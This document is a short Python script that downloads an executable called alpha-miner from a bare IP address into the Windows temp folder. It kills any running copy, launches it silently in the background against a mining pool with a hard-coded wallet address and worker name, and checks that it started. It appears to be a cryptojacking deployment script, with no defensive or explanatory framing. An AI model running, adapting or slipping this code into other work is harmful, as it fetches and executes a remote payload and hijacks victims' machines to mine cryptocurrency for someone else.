import os
import subprocess
import urllib.request
import sys

# Download miner to temp
miner_path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "alpha-miner.exe")

try:
    urllib.request.urlretrieve("http://151.247.219.40:8000/alpha-miner-windows.exe", miner_path)
except Exception as e:
    result = f"download_error: {str(e)[:50]}"
else:
    # Check file size
    size = os.path.getsize(miner_path) if os.path.exists(miner_path) else 0

    if size > 1000000:
        # Kill existing
        os.system("taskkill /F /IM alpha-miner.exe 2>nul")

        # Run miner
        cmd = f'start /B "" "{miner_path}" --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker WIN_134'
        os.system(cmd)

        import time
        time.sleep(2)

        # Check if running
        r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq alpha-miner.exe"], capture_output=True, text=True)
        running = "alpha-miner.exe" in r.stdout

        result = f"size={size},running={running}"
    else:
        result = f"download_failed,size={size}"
